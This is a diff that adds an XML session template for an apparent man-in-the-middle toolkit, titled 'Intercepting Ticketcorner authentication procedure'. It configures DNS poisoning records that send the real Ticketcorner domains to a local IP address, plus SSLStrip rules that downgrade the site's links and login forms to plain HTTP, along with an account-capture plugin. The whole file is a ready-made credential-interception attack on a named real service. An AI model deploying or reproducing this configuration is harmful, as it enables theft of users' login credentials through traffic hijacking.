@@ -1,0 +1,68 @@
+	<SessionTemplate>
+<Config name="authentication_ticketcorner" description="Intercepting Ticketcorner authentication procedure">
+</Config>
+
+<Plugins>
+<Plugin name="DNS Poisoning" dirname="DNSPoisoning">
+
+<ArrayOfDNSPoisonRecord xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+  <DNSPoisonRecord>
+    <HostName>www.ticketcorner.ch</HostName>
+    <IPAddress>192.168.43.133</IPAddress>
+  </DNSPoisonRecord>
+  <DNSPoisonRecord>
+    <HostName>secure.ticketcorner.ch</HostName>
+    <IPAddress>192.168.43.133</IPAddress>
+  </DNSPoisonRecord>
+  <DNSPoisonRecord>
+    <HostName>ticketcorner.ch</HostName>
+    <IPAddress>192.168.43.133</IPAddress>
+  </DNSPoisonRecord>
+</ArrayOfDNSPoisonRecord>
+</Plugin>
+
+<Plugin name="HTTP accounts" dirname="HTTPAccounts">
+
+<PluginData xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+  <Records />
+</PluginData>
+</Plugin>
+
+<Plugin name="SSLStrip" dirname="SSLStrip">
+
+<ArrayOfSSLStripRecord xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+  <SSLStripRecord>
+    <HostName>ticketcorner.ch</HostName>
+    <ContentType>text/html</ContentType>
+    <Tag>a</Tag>
+  </SSLStripRecord>
+  <SSLStripRecord>
+    <HostName>www.ticketcorner.ch</HostName>
+    <ContentType>text/html</ContentType>
+    <Tag>form</Tag>
+  </SSLStripRecord>
+  <SSLStripRecord>
+    <HostName>www.ticketcorner.ch</HostName>
+    <ContentType>text/html</ContentType>
+    <Tag>a</Tag>
+  </SSLStripRecord>
+  <SSLStripRecord>
+    <HostName>ticketcorner.ch</HostName>
+    <ContentType>text/html</ContentType>
+    <Tag>form</Tag>
+  </SSLStripRecord>
+    <SSLStripRecord>
+    <HostName>secure.ticketcorner.ch</HostName>
+    <ContentType>text/html</ContentType>
+    <Tag>form</Tag>
+  </SSLStripRecord>
+  <SSLStripRecord>
+    <HostName>secure.ticketcorner.ch</HostName>
+    <ContentType>text/html</ContentType>
+    <Tag>a</Tag>
+  </SSLStripRecord>
+</ArrayOfSSLStripRecord>
+</Plugin>
+
+</Plugins>
+</SessionTemplate>
